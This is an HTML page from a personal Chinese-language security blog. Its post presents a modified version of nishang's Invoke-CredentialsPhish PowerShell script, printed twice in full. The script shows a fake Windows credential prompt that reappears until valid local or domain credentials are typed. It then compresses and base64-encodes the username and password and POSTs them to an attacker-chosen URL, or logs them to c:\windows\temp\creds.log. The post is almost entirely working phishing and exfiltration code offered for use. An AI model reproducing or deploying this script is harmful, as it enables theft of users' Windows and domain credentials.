<!DOCTYPE HTML>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <meta name="Keywords" content="blog"/>
    <meta name="Description" content="blog"/>
    <title>Simple</title>
    <link rel="shortcut icon" href="/static/favicon.png"/>
    <link rel="stylesheet" type="text/css" href="/main.css" />
</head>
<body>
<div class="main">
    <div class="header">
    	<ul id="pages">
            <li><a href="/">home</a></li>
            <li><a href="/#/tags">tags</a></li>
            <li><a href="/#/archive">archive</a></li>
    	</ul>
    </div>
	<div class="wrap-header">
    <h1>
    <a href="/" id="title"></a>
    </h1>
	</div>
<xmp id="md" style="display: none;">
<!-- markdown -->
因为 nishang 中的 Invoke-CredentialsPhish 只能将用户密码输出显示, 所以就自己改了改.

未指定参数则默认保存在 `c:\windows\temp\creds.log` 中, 指定 url 则会传输 Post Raw  Data, 通过 `php://input` 接收.

使用 nishang 中的 `Invoke-Decode` 解码数据.

```
function Invoke-CredentialsPhish
{
<#
.SYNOPSIS
Nishang script which opens a user credential prompt.

.DESCRIPTION
This payload opens a prompt which asks for user credentials and does not go away till valid local or domain credentials are entered in the prompt.

.PARAMETER Url
The URL of the webserver where POST requests would be sent. The Webserver must beb able to log the POST requests.
The encoded values from the webserver could be decoded bby using Invoke-Decode from Nishang.

.EXAMPLE
PS > Invoke-CredentialsPhish

.EXAMPLE
PS > Invoke-CredentialsPhish -Url http://example.com/post.php

.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang
#>

[CmdletBinding()]
Param (
    [Parameter(Parametersetname="Url")]
    [String]
    $url
)

    $ErrorActionPreference="SilentlyContinue"
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
    while($true)
    {
        $credential = $host.ui.PromptForCredential("执行此操作需要凭据", "请输入您的用户名和密码", "", "")
        if($credential)
        {
            $creds = $credential.GetNetworkCredential()
            [String]$user = $creds.username
            [String]$pass = $creds.password
            [String]$domain = $creds.domain
            $authlocal = $DS.ValidateCredentials($user, $pass)
            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
            {
            	$now = Get-Date;
                $output = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain + " Domain:" + $authdomain.name + " " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
                $ms = New-Object IO.MemoryStream
		        $action = [IO.Compression.CompressionMode]::Compress
		        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
		        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
		        $output | ForEach-Object {$sw.WriteLine($_)}
		        $sw.Close()
		        $param = [Convert]::ToBase64String($ms.ToArray())
                if ($url){
			        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
			        $http_request.open("POST", $url, $false) 
			        $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
			        $http_request.setRequestHeader("Content-length", $param.length)
			        $http_request.setRequestHeader("Connection", "close") 
			        $http_request.send($param) 
			        $script:session_key=$http_request.responseText
                } else {
                	$filename = "c:\windows\temp\creds.log" 
                	Out-File -FilePath $fileName -Append -InputObject "$param" 
                }
                break
            }
        }
    }
}
```
<!-- markdown end -->
</xmp>
<div class="entry" id="main">
<!-- content -->
<p>因为 nishang 中的 Invoke-CredentialsPhish 只能将用户密码输出显示, 所以就自己改了改.</p>

<p>未指定参数则默认保存在 <code>c:\windows\temp\creds.log</code> 中, 指定 url 则会传输 Post Raw  Data, 通过 <code>php://input</code> 接收.</p>

<p>使用 nishang 中的 <code>Invoke-Decode</code> 解码数据.</p>

<pre><code>function Invoke-CredentialsPhish
{
&lt;#
.SYNOPSIS
Nishang script which opens a user credential prompt.

.DESCRIPTION
This payload opens a prompt which asks for user credentials and does not go away till valid local or domain credentials are entered in the prompt.

.PARAMETER Url
The URL of the webserver where POST requests would be sent. The Webserver must beb able to log the POST requests.
The encoded values from the webserver could be decoded bby using Invoke-Decode from Nishang.

.EXAMPLE
PS &gt; Invoke-CredentialsPhish

.EXAMPLE
PS &gt; Invoke-CredentialsPhish -Url http://example.com/post.php

.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang
#&gt;

[CmdletBinding()]
Param (
    [Parameter(Parametersetname="Url")]
    [String]
    $url
)

    $ErrorActionPreference="SilentlyContinue"
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
    while($true)
    {
        $credential = $host.ui.PromptForCredential("执行此操作需要凭据", "请输入您的用户名和密码", "", "")
        if($credential)
        {
            $creds = $credential.GetNetworkCredential()
            [String]$user = $creds.username
            [String]$pass = $creds.password
            [String]$domain = $creds.domain
            $authlocal = $DS.ValidateCredentials($user, $pass)
            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
            {
                $now = Get-Date;
                $output = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain + " Domain:" + $authdomain.name + " " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
                $ms = New-Object IO.MemoryStream
                $action = [IO.Compression.CompressionMode]::Compress
                $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
                $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
                $output | ForEach-Object {$sw.WriteLine($_)}
                $sw.Close()
                $param = [Convert]::ToBase64String($ms.ToArray())
                if ($url){
                    $http_request = New-Object -ComObject Msxml2.XMLHTTP 
                    $http_request.open("POST", $url, $false) 
                    $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
                    $http_request.setRequestHeader("Content-length", $param.length)
                    $http_request.setRequestHeader("Connection", "close") 
                    $http_request.send($param) 
                    $script:session_key=$http_request.responseText
                } else {
                    $filename = "c:\windows\temp\creds.log" 
                    Out-File -FilePath $fileName -Append -InputObject "$param" 
                }
                break
            }
        }
    }
}
</code></pre>
<!-- content end -->
</div>
<br>
<br>
    <div id="disqus_thread"></div>
	<div class="footer">
		<p>© Copyright 2017-2019 by X1r0z</p>
	</div>
</div>
<script src="main.js"></script>
<script id="content" type="text/mustache">
    <h1>{{title}}</h1>
    <div class="tag">
    {{date}}
    {{#tags}}
    <a href="/#/tag/{{name}}">#{{name}}</a>
    {{/tags}}
    </div>
</script>
<script id="pagesTemplate" type="text/mustache">
    {{#pages}}
    <li>
        <a href="{{path}}">{{title}}</a>
    </li>
    {{/pages}}
</script>
<script>
$(document).ready(function() {
    $.ajax({
        url: "main.json",
        type: "GET",
        dataType: "json",
        success: function(data) {
            $("#title").html(data.name);
            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
            var pagesHtml = pagesTemplate.render({"pages": data.pages});
            $("#pages").append(pagesHtml);
            //path
            var path = "credentialsphish-with-http-request.html";
            //path end
            var now = 0;
            for (var i = 0; i < data.posts.length; ++i)
                if (path == data.posts[i].path)
                    now = i;
            var post = data.posts[now];
            var tmp = post.tags.split(" ");
            var tags = [];
            for (var i = 0; i < tmp.length; ++i)
                if (tmp[i].length > 0)
                    tags.push({"name": tmp[i]});
            var contentTemplate = Hogan.compile($("#content").html());
            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
            $("#main").prepend(contentHtml);
            if (data.disqus_shortname.length > 0) {
                var disqus_shortname = data.disqus_shortname;
                (function() {
                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
                })();
            }
        }
    });
});
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
</script>
</body>
</html>
